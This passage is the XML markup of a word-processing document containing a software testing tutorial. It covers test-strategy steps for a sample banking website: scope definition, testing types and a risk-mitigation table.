          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00E97930" w:rsidRDefault="00D01E5E" w:rsidP="00D01E5E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pP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should take a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>look around</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> this website and also </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>review </w:t>
      </w:r>
      <w:hyperlink r:id="rId144" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="40A2B5"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>product documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>. Review of product documentation helps you to understand all the features of the website as well as how to use it. If you are unclear on any items, you might </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>interview</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> customer, developer, designer to get more information.</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 Develop Test Strategy</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Strategy is a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>critical step </w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve">in making a Test Plan. A Test Strategy </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>document,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a high-level document, which is usually developed by Test Manager. This document defines:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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project’s </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>testing objectives</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> and the means to achieve them</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Determines testing </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>effort</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costs</w:t>
      </w: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Back to your project, you need to develop Test Strategy for testing that banking website. You should follow steps below</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2.1) Define Scope of Testing</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Before the start of any test activity, scope of the testing should be known. You must think hard about it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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components of the system to be tested (hardware, software, middleware, etc.) are defined as "</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>in scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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components of the system that will not be tested also need to be clearly defined as being "</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>out of scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w: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Defining the scope of your testing project is very important for all stakeholders. A precise scope helps you</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Give everyone a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>confidence &amp; accurate information</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> of the testing you  are doing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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All project members will have a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>clear</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> understanding about what is tested and what is not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i/>
          <w:iCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>How do you determine scope your project?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determine scope, you must –</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Precise customer requirement</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Project Budget</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E"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Product Specification</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Skills &amp; talent of your test team</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Now should clearly define the "in scope" and "out of scope" of the testing.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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As the software requirement </w:t>
      </w:r>
      <w:hyperlink r:id="rId145" w:anchor="heading=h.ftgetk7f23qj" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="40A2B5"/>
          </w:rPr>
          <w:t>specs</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>, the project Guru99 Bank only focus on testing all the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>functions</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> and external interface of website </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Guru99</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> Bank (</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Nonfunctional testing such as </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>stress</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>performance</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>logical database</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> currently will not be tested. (</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>out of</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> scope)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Problem Scenario</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customer wants you to test his API. But the project budget does not permit to do so. In such a case what will you do?</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Well, in such case you need to convince the customer that API testing is extra work and will consume significant resources. Give him data supporting your facts. Tell him if API testing is included in-scope the budget will increase by XYZ amount.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customer agrees and accordingly the new scopes, out of scope items are</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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In-scope items: Functional Testing, API Testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4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Out of scope items: Database testing, hardware &amp; any other external interfaces</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lastRenderedPageBreak/>
        <w:t>Step 2.2) Identify Testing Type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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Testing Type</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> is a standard test procedure that gives an expected test outcome.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Each testing type is formulated to identify a specific type of product bugs. But, all Testing Types are aimed at achieving one common goal “</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Early detection of</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> all the defects before releasing the product to the customer”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w: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w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>commonly used</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> testing types are described as following figure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There are </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>tons of Testing Types</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> for testing software product. Your team </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>cannot have</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> enough efforts to handle all kind of testing. As Test Manager, you must set </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>priority</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> of the Testing Types</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Which Testing Types should be </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>focused</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> for web application testing?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidRDefault="00D01E5E" w:rsidP="00F97FFE">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Which Testing Types should be </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>ignored</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> for saving cost?</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2.3) Document Risk &amp; Issues</w:t>
      </w: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Risk is future’s </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>uncertain event</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> with a probability of </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>occurrence</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> and a </w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>potential</w:t>
      </w:r>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> for loss. When the risk </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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>actually</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t xml:space="preserve"> happens, it becomes the ‘</w:t>
      </w:r>
      <w:r w:rsidRPr="00E97930">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>issue’.</w:t>
      </w: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the article </w:t>
      </w:r>
      <w:hyperlink r:id="rId146" w:history="1">
        <w:r w:rsidRPr="00E97930">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="40A2B5"/>
          </w:rPr>
          <w:t>Risk Analysis and Solution</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00B86CAC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>, you have already learned about the ‘Risk’ analysis in detail and identified potential risks in the project.</w:t>
      </w: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In the Test Plan, you will document those risks</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:horzAnchor="page" w:tblpX="906" w:tblpY="760"/>
        <w:tblW w:w="11189"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87"/>
        <w:gridCol w:w="7402"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="363"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3787"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Risk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7402"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Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">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Team member lack the required skills for website testing.</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Plan </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>training course</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> to skill up your members</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="558"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="378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project schedule is too tight; it's hard to complete this project on time</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7402"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Set </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>Test Priority</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for each of the test activity.  </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D01E5E" w:rsidRPr="00B86CAC" w:rsidTr="008E672E">
        <w:trPr>
          <w:trHeight w:val="363"/>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Manager has poor management skill</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Plan </w:t>
            </w:r>
            <w:r w:rsidRPr="00E97930">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t>leadership training</w:t>
            </w:r>
            <w:r w:rsidRPr="00B86CAC">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:color w:val="343434"/>
              </w:rPr>
              <w:t> for manager</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
